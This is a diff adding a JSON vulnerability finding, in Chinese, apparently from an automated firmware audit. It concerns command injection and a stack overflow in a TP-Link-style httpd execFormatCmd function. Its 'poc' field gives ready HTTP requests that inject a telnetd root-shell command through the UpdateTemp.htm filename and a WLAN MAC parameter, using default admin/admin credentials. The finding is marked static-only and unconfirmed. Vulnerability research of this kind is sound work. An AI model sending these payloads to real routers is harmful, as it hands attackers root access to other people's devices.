@@ -1,0 +1,33 @@
+{
+  "job_id": "6df0ba4135c9",
+  "title": "httpd execFormatCmd 无界 vsprintf + tp_systemEx：栈溢出 + 任意命令执行原语（193 个受 HTTP 驱动的调用方）",
+  "severity": "high",
+  "confidence": 0.55,
+  "vuln_class": "command_injection",
+  "cwe": "CWE-78",
+  "binary_md5": "9582aa23b0bc2de099b9997b09457d01",
+  "binary_path": "firmware/binwalk_extracted/firmware.extracted/100000/squashfs-root/usr/bin/httpd",
+  "reachability": "static-only",
+  "summary": "httpd(usr/bin/httpd, md5 9582aa23) 的 execFormatCmd(0x5308cc) 是典型 TP-Link 命令执行包装：va_start 后对栈上 char s[260] 做无长度校验的 vsprintf，随后调用 tp_systemEx(s) 以 /bin/sh 执行。该函数共有 193 个调用方，涵盖大量由 HTTP userRpm 页面驱动的 sw*/wlan*/nas* 配置处理器（wlanMacFiltEntryAdd 0x4cc73c、nasSambaSetUserList 0x5471d0、swSetWirelessMode 0x4bfd68、upgradeFirmware 0x4f6dd4、httpFirmwareUpdateTempRpmHtm 0x47cd50 对应 /userRpm/UpdateTemp.htm 等）。攻击者把分号/引号注入任一格式化参数即可突破 shell 命令（tp_systemEx），同时超长输入（>260 字节）直接造成栈溢出。双保险：PRINTF_ECHO(0x45bda0) 二次 vsprintf 后把用户串嵌入 echo 格式串再交给 execFormatCmd。动态差分 trace（89a1a1a84d25 via=stdin、cdfda3b9c676 via=net:80、d129c68e4930 minidlna 等）在 qemu-user 下为空差分：守护进程需完整运行环境，未能将 payload 送达解析分支；本条目为静态验证，未观察到崩溃。",
+  "evidence": [
+    "fw_get_ast md5=9582aa23 addr=0x5308cc: int execFormatCmd(char *format, ...){ char s[260]; va_start(arg,format); vsprintf(s,format,arg); return tp_systemEx(s); } —— vsprintf 无边界、tp_systemEx 执行 shell",
+    "fw_get_ast addr=0x45bda0 PRINTF_ECHO: char s[260]; vsprintf(s,format,arg); return execFormatCmd(\"echo \\\"====>>>>%s\\\" > /dev/ttyS0 \\r\\n\", s); —— 用户串进入 echo 后整条交给 system 层",
+    "fw_call_trace inbound tp_systemEx 150 调用方 / inbound execFormatCmd 193 调用方（httpd_9582aa23），含 wlanMacFiltEntryAdd 0x4cc73c、swSetWirelessMode 0x4bfd68、upgradeFirmware 0x4f6dd4、httpFirmwareUpdateTempRpmHtm 0x47cd50（路由 /userRpm/UpdateTemp.htm）",
+    "fw_call_trace inbound PRINTF_ECHO 42 调用方：pppoeCmdReq 0x4fde5c、upgradeFirmware 0x4f6dd4、reset_lan_ip 0x4fb3d8、httpFirmwareUpdateTempRpmHtm 0x47cd50",
+    "web/userRpm/PingIframeRpm.htm & DiagnosticRpm.htm 确认 POST/GET 参数名（pingAddr、doType、sendNum、pSize、overTime、trHops）",
+    "动态：trace 89a1a1a84d25(httpd via=stdin ok_empty_diff)、cdfda3b9c676(httpd net:80 ok_empty_diff)、9ecff5fde521(uclited)、d129c68e4930(minidlna)、e5f4b1db25cc(bpalogin)、da8bd25a4f96(dhcp6s)、c12ed8c44dbc(minidlna 带配置 net:8200) 均 ok_empty_diff；qe-92655be9(dhcp6s config) 非零退出无 signal"
+  ],
+  "session_id": "s-mt6lgkly-2e7f",
+  "function_name": "execFormatCmd",
+  "preconditions": "LAN 侧可达 httpd:80，管理员登录态（默认 admin/admin）；userRpm 处理器将用户可控参数传入 execFormatCmd/PRINTF_ECHO 的格式化参数",
+  "exploit_sketch": "利用 execFormatCmd 的 vsprintf 无边界：任何调用方以用户串作变参即构成注入。两个触发头：(a) PRINTF_ECHO 的 echo 双引号逃逸 \\\";cmd;#；(b) 超过 260 字节的栈溢出覆盖返回地址（MIPS BE，需 ROP）。对 wlanMacFiltEntryAdd 一类处理器，mac 格式串未做字符过滤；对 UpdateTemp.htm 固件名同样未过滤。",
+  "remediation": "execFormatCmd/PRINTF_ECHO 改用 snprintf/vsnprintf 并限制写入长度；对进入 shell 的参数做白名单/转义（拒绝 ; & | ` $ 空格 换行）；升级到修复 CVE-2015-3035 系列之后的固件",
+  "poc": "需已登录(默认 admin/admin)后：POST /userRpm/UpdateTemp.htm HTTP/1.1（multipart 上传，filename 字段/参数混入注入串）：\\nContent-Disposition: form-data; name=\\\"filename\\\"; filename=\\\"x\\\";telnetd;#.bin\\\"\\n或经 WLAN 配置页注入：POST /userRpm/WlanMacFilterRpmAdv.htm?mode=add&mac=AA:BB:CC:DD:EE:FF%22;%20telnetd%20-l%20/bin/sh%20-p%20999;%23\\n命令串经 execFormatCmd 的 vsprintf 拼入 shell 命令被 tp_systemEx 执行（telnetd -l /bin/sh -p 999 落地 root shell）；超长参数（>260 字节）同步触发栈溢出。",
+  "call_chain": "httpDispatcher(0x425d08) → httpRpmConfAdd 注册的各 userRpm 处理器(0x47cd50 httpFirmwareUpdateTempRpmHtm / 0x4f6dd4 upgradeFirmware / 0x4cc73c wlanMacFiltEntryAdd / 0x4bfd68 swSetWirelessMode) → PRINTF_ECHO(0x45bda0) → execFormatCmd(0x5308cc) → tp_systemEx → system",
+  "function_addr": "0x5308cc",
+  "id": "F-mt6mb3gt-e526",
+  "status": "draft",
+  "owner": "token-admin",
+  "recorded_at": "2026-08-24T02:29:24Z",
+  "history": []
+}
